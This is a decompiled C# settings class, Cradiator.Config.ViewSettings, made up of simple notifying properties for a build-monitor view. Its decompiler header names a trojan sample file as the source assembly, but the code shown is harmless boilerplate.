// Decompiled with JetBrains decompiler
// Type: Cradiator.Config.ViewSettings
// Assembly: FileOptio, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0135208B-21B4-457A-BFCD-FFD93FD8BA14
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-c07e2154bd7603dd3a6fdf4810a799ff7d31670747236cd1d2a52be397c0676b.exe

using Cradiator.Extensions;
using System.ComponentModel;

namespace Cradiator.Config
{
  public class ViewSettings : IViewSettings, INotifyPropertyChanged
  {
    protected string _url;
    protected string _skinName;
    protected string _projectNameRegEx;
    protected string _categoryRegEx;
    protected string _viewName;
    protected bool _showOnlyBroken;
    protected string _serverNameRegEx;
    protected bool _ShowServerName;
    private bool _showOutOfDate;
    private int _outOfDateDifferenceInMinutes;

    public string URL
    {
      get => this._url;
      set
      {
        if (this._url == value)
          return;
        this._url = value;
        this.Notify(nameof (URL));
      }
    }

    public string SkinName
    {
      get => this._skinName;
      set
      {
        if (this._skinName == value)
          return;
        this._skinName = value;
        this.Notify(nameof (SkinName));
      }
    }

    public string ProjectNameRegEx
    {
      get => this._projectNameRegEx.GetRegEx();
      set
      {
        if (this._projectNameRegEx == value)
          return;
        this._projectNameRegEx = value;
        this.Notify(nameof (ProjectNameRegEx));
      }
    }

    public string CategoryRegEx
    {
      get => this._categoryRegEx.GetRegEx();
      set
      {
        if (this._categoryRegEx == value)
          return;
        this._categoryRegEx = value;
        this.Notify(nameof (CategoryRegEx));
      }
    }

    public string ViewName
    {
      get => this._viewName;
      set
      {
        if (this._viewName == value)
          return;
        this._viewName = value;
        this.Notify(nameof (ViewName));
      }
    }

    public bool ShowOnlyBroken
    {
      get => this._showOnlyBroken;
      set
      {
        if (this._showOnlyBroken == value)
          return;
        this._showOnlyBroken = value;
        this.Notify(nameof (ShowOnlyBroken));
      }
    }

    public string ServerNameRegEx
    {
      get => this._serverNameRegEx;
      set
      {
        if (this._serverNameRegEx == value)
          return;
        this._serverNameRegEx = value;
        this.Notify(nameof (ServerNameRegEx));
      }
    }

    public bool ShowServerName
    {
      get => this._ShowServerName;
      set
      {
        if (this._ShowServerName == value)
          return;
        this._ShowServerName = value;
        this.Notify(nameof (ShowServerName));
      }
    }

    public bool ShowOutOfDate
    {
      get => this._showOutOfDate;
      set
      {
        if (this._showOutOfDate == value)
          return;
        this._showOutOfDate = value;
        this.Notify(nameof (ShowOutOfDate));
      }
    }

    public int OutOfDateDifferenceInMinutes
    {
      get => this._outOfDateDifferenceInMinutes;
      set
      {
        if (this._outOfDateDifferenceInMinutes == value)
          return;
        this._outOfDateDifferenceInMinutes = value;
        this.Notify(nameof (OutOfDateDifferenceInMinutes));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    protected void Notify(string propertyName)
    {
      if (this.PropertyChanged == null)
        return;
      this.PropertyChanged((object) this, new PropertyChangedEventArgs(propertyName));
    }
  }
}
